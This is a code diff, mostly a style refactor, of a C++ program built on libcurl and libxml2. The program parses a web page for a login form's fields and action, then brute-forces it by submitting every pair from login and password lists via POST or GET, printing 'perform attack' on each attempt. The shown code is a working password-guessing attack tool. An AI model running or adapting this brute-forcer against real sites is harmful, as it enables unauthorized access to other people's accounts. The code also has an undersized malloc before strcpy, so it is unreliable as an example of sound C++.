@@ -12,100 +12,99 @@ using namespace std;
 //
 struct Context {
 	Context(): containsForm(false) { }
-	char *formMethod = NULL;
-	char *login = NULL;
-	char *password = NULL;
-	char *action = NULL;
+	char* formMethod = NULL;
+	char* login = NULL;
+	char* password = NULL;
+	char* action = NULL;
 	bool containsForm;
 } form;
 
 
 // Possible login fields names
-static const char *possibleLoginFields[] = {"login", "your_email", "username"};
+static const char* possibleLoginFields[] = {"login", "your_email", "username"};
 
 //
 //  libcurl write callback function
 //
-static int writer(char *data, size_t size, size_t nmemb,
-                  std::string *writerData) {
-  if (writerData == NULL)
-	return 0;
+static int writer(char* data, size_t size, size_t nmemb,
+                  string* writerData) {
+    if (writerData == NULL)
+        return 0;
 
-  writerData->append(data, size*nmemb);
+    writerData->append(data, size*nmemb);
 
-  return size * nmemb;
+    return size * nmemb;
 }
 
 //
 //  libcurl connection initialization
 //
-static size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
-	struct WriteThis *pooh = (struct WriteThis *)userp;
-	if(size*nmemb < 1) {
-		return 0;
-	}
+static size_t read_callback(void* ptr, size_t size, size_t nmemb, void* userp) {
+    struct WriteThis* pooh = (struct WriteThis *)userp;
+    if(size * nmemb < 1) {
+        return 0;
+    }
 
-  return 0;
+    return 0;
 }
 
-static bool init(CURL *&conn, char *url, string& responceBuffer, char* errorBuffer) {
+static bool init(CURL*& conn, char* url, string& responceBuffer, char* errorBuffer) {
 	CURLcode code;
-
 	curl_global_init(CURL_GLOBAL_DEFAULT);	
 	conn = curl_easy_init();
 
-	if (conn == NULL) {
-		fprintf(stderr, "Failed to create CURL connection\n");
-
-		exit(EXIT_FAILURE);
-	}
-
-	code = curl_easy_setopt(conn, CURLOPT_ERRORBUFFER, errorBuffer);
-	if (code != CURLE_OK) {
-    	fprintf(stderr, "Failed to set error buffer [%d]\n", code);
-
+    if (conn == NULL) {
+        fprintf(stderr, "Failed to create CURL connection\n");
+    
+        exit(EXIT_FAILURE);
+    }
+    
+    code = curl_easy_setopt(conn, CURLOPT_ERRORBUFFER, errorBuffer);
+    if(code != CURLE_OK) {
+        fprintf(stderr, "Failed to set error buffer [%d]\n", code);
+    
+        return false;
+    }
+    
+    code = curl_easy_setopt(conn, CURLOPT_URL, url);
+    if (code != CURLE_OK) {
+    	fprintf(stderr, "Failed to set URL [%s]\n", errorBuffer);
+    
     	return false;
-  	}
-
-	code = curl_easy_setopt(conn, CURLOPT_URL, url);
-	if (code != CURLE_OK) {
-		fprintf(stderr, "Failed to set URL [%s]\n", errorBuffer);
-
-		return false;
-	}
-
-  	code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, 1L);
-	if (code != CURLE_OK) {
+    }
+    
+    code = curl_easy_setopt(conn, CURLOPT_FOLLOWLOCATION, 1L);
+    if (code != CURLE_OK) {
     	fprintf(stderr, "Failed to set redirect option [%s]\n", errorBuffer);
-
+    
     	return false;
-	}
-
-	code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer);
-	if (code != CURLE_OK) {
+    }
+    
+    code = curl_easy_setopt(conn, CURLOPT_WRITEFUNCTION, writer);
+    if (code != CURLE_OK) {
     	fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);
-
+    
     	return false;
-  	}
-
-  	code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &responceBuffer);
-  	if (code != CURLE_OK) {
+    }
+    
+    code = curl_easy_setopt(conn, CURLOPT_WRITEDATA, &responceBuffer);
+    if (code != CURLE_OK) {
     	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
-
+    
     	return false;
-  	}
+    }
+    
+    /* we want to use our own read function */ 
+    code = curl_easy_setopt(conn, CURLOPT_READFUNCTION, &read_callback);
+if (code != CURLE_OK) {
+	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
 
-  	/* we want to use our own read function */ 
-	code = curl_easy_setopt(conn, CURLOPT_READFUNCTION, &read_callback);
-	if (code != CURLE_OK) {
-    	fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
-
-    	return false;
-	}
+	return false;
+}
   return true;
 }
 
-const xmlChar *findElement(const xmlChar **attributes, const char *element) {
+const xmlChar* findElement(const xmlChar** attributes, const char* element) {
 	for(int i = 0; *(attributes + i) != NULL; i++) {
 		if(!strcasecmp((char*)(*(attributes + i)), element)) {
 			return *(attributes + i + 1);
@@ -114,7 +113,7 @@ const xmlChar *findElement(const xmlChar **attributes, const char *element) {
 	return NULL;
 }
 
-const xmlChar *findElementNameByType(const xmlChar **attributes, const char *elementType) {
+const xmlChar* findElementNameByType(const xmlChar** attributes, const char* elementType) {
 	for(int i = 0; *(attributes + i) != NULL; i++) {
 		if(!strcasecmp((char*)(*(attributes + i)), "type") && !strcasecmp((char*)(*(attributes + i + 1)), elementType)) {
 			for(int j = 0; *(attributes + j) != NULL; j++) {
@@ -127,7 +126,7 @@ const xmlChar *findElementNameByType(const xmlChar **attributes, const char *ele
 	return NULL;
 }
 
-const xmlChar *findElementValueByType(const xmlChar **attributes, const char *elementType) {
+const xmlChar* findElementValueByType(const xmlChar** attributes, const char* elementType) {
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), elementType)) {
 			return *(attributes + i + 1);
@@ -139,7 +138,7 @@ const xmlChar *findElementValueByType(const xmlChar **attributes, const char *el
 //
 //  libxml start element callback function
 //
-static void StartElement(void *voidContext, const xmlChar *name, const xmlChar **attributes) {
+static void StartElement(void* voidContext, const xmlChar* name, const xmlChar** attributes) {
 	Context *context = (Context *)voidContext;
 	if (!strcasecmp((char *)name, "form")) {
 		const xmlChar* tempFormMethod = findElement(attributes, "method");
@@ -159,7 +158,7 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 			printf("Method was not found \n");
 		}
 	}
-	if(form.containsForm  && !strcasecmp((char *)name, "input")) {
+	if(form.containsForm  && !strcasecmp((char*)name, "input")) {
 		if(!form.password) {
 			const xmlChar* tempFormPassword = findElementNameByType(attributes, "password");
 			if(tempFormPassword) {
@@ -169,18 +168,18 @@ static void StartElement(void *voidContext, const xmlChar *name, const xmlChar *
 			}
 		}
 		if(!form.login) {
-			const xmlChar* tempFormLogin = findElementNameByType(attributes, "text");
-			if(tempFormLogin) {
-				for(int i = 0; i < 3; i++) {
-					if(!strcasecmp((char*)tempFormLogin, possibleLoginFields[i])) {
-						form.login = (char*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
-						strcpy(form.login, (char*)tempFormLogin);
-						printf("=== Found login  = %s \n", form.login);
-					}
-				}
-			}
-		}
-	}
+            const xmlChar* tempFormLogin = findElementNameByType(attributes, "text");
+            if(tempFormLogin) {
+                for(int i = 0; i < 3; i++) {
+                    if(!strcasecmp((char*)tempFormLogin, possibleLoginFields[i])) {
+                        form.login = (char*)malloc((strlen((char*)tempFormLogin))*sizeof(xmlChar*));
+                        strcpy(form.login, (char*)tempFormLogin);
+                        printf("=== Found login  = %s \n", form.login);
+                    }
+                }
+            }
+        }
+    }
 }
 
 static htmlSAXHandler saxHandler = {NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
@@ -190,7 +189,7 @@ static htmlSAXHandler saxHandler = {NULL, NULL, NULL, NULL, NULL, NULL, NULL, NU
 //
 //  Parse given (assumed to be) HTML text and btutforce atack on the page
 //
-static void parseHtml(const std::string &html) {
+static void parseHtml(const string &html) {
 	htmlParserCtxtPtr ctxt;
 	Context context;
 	ctxt = htmlCreatePushParserCtxt(&saxHandler, &context, "", 0, "", XML_CHAR_ENCODING_NONE);
@@ -199,28 +198,28 @@ static void parseHtml(const std::string &html) {
 	htmlFreeParserCtxt(ctxt);
 }
 
-string* concat(char* action, const char *login, string loginValue, const char *password, string passwordValue) {
-	string *result = new string;
-
-	if(action) {
-		result->append(action);
-		result->append("?");
-	}
-	result->append((char*)login);
-	result->append("=");
-	result->append(loginValue);
-	result->append("&");
-	result->append((char*)password);
-	result->append("=");
-	result->append(passwordValue);
-
-	return result;
+string concat(char* action, const char* login, string loginValue, const char* password, string passwordValue) {
+    string result;
+    
+    if(action) {
+    	result.append(action);
+    	result.append("?");
+    }
+    result.append((char*)login);
+    result.append("=");
+    result.append(loginValue);
+    result.append("&");
+    result.append((char*)password);
+    result.append("=");
+    result.append(passwordValue);
+    
+    return result;
 }
 
 static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passwords, 
 										Context &form, char *action, string &login, string &password) {
-	string *data;
 	CURL *curl;
+	string data;
 	CURLcode code;
 	string respBuffer;
 	char errBuffer[CURL_ERROR_SIZE];
@@ -250,14 +249,14 @@ static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passw
 			if(!strcasecmp((char*)form.formMethod, "post")) {
 				curl_easy_setopt(curl, CURLOPT_URL,  action);
 				data = concat(NULL, form.login, *loginIt, form.password, *passwordIt);
-				cout <<*data <<endl;
+				cout <<data <<endl;
 				cout <<"action = " <<action <<endl;
 				curl_easy_setopt(curl, CURLOPT_POST, 1);
-				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data->c_str());
+				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
 		    } else if (!strcasecmp((char*)form.formMethod, "get")) {
 				data = concat(action, form.login, *loginIt, form.password, *passwordIt);
-				cout <<*data <<endl;
-				curl_easy_setopt(curl, CURLOPT_URL,  data->c_str());
+				cout <<data <<endl;
+				curl_easy_setopt(curl, CURLOPT_URL,  data.c_str());
 			}
 			cout <<"perform attack" <<endl;
 			respBuffer.clear();
